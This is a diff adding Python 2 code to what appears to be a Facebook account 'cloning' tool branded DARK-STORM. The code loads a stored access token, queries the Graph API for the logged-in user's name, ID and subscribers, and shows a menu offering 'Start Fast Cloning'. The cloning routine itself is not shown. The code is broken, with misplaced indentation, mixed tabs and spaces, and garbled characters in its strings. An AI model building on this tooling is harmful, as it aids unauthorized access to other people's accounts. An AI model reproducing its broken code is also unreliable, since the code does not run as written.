@@ -303,3 +303,54 @@ def login1():
 			time.sleep(1)
 			keluar()
 			
+else:
+			print("\n\x1b[1;97mPassword/Email is wrong")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
+			
+def menu():
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\x1b[1;94mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(o.text)
+		nama = a['name']
+		id = a['id']
+                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+                b = json.loads(t.text)
+                sub = str(b['summary']['total_count'])
+	except KeyError:
+		os.system('clear')
+		print"\033[1;97mв€†CPв€†Creat A New Account"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\x1b[1;94mThere is no internet connection"
+		keluar()
+	os.system("clear") #Dev:DARK-STORM-BOYS
+	print logo
+	print "\033[1;37m[!]\033[1;91m Logged in User Information\033[1;92m"
+	time.sleep(0.05)
+	print "\033[1;37m[вЂў]\033[1;91m Name\033[1;93m:\033[1;91m"+nama+"\033[1;93m               "
+	time.sleep(0.05)
+	print "\033[1;37m[вЂў]\033[1;91m ID\033[1;93m:\033[1;91m"+id+"\x1b[1;93m              "
+	time.sleep(0.05)
+	print "\033[1;97mвЂў-----------------\033[1;37mDARK-STORM\033[1;97m-----------------вЂў"
+	print "\033[1;92m[1]\033[1;47m\033[1;31mStart Fast Cloning                          \033[1;0m"
+	time.sleep(0.05)
+	print "\033[1;93m[2]\033[1;47m\033[1;31mID Not Found Problem Solve                     \033[1;0m"
+	time.sleep(0.05)
+	print "\033[1;94m[3]\033[1;47m\033[1;31mRest/Update DARK-SH4DOW                         \033[1;0m"
+	time.sleep(0.05)
+	print "\033[1;95m[0]\033[1;47m\033[1;31mExit                                      \033[1;0m"
+	time.sleep(0.05)
+	pilih()
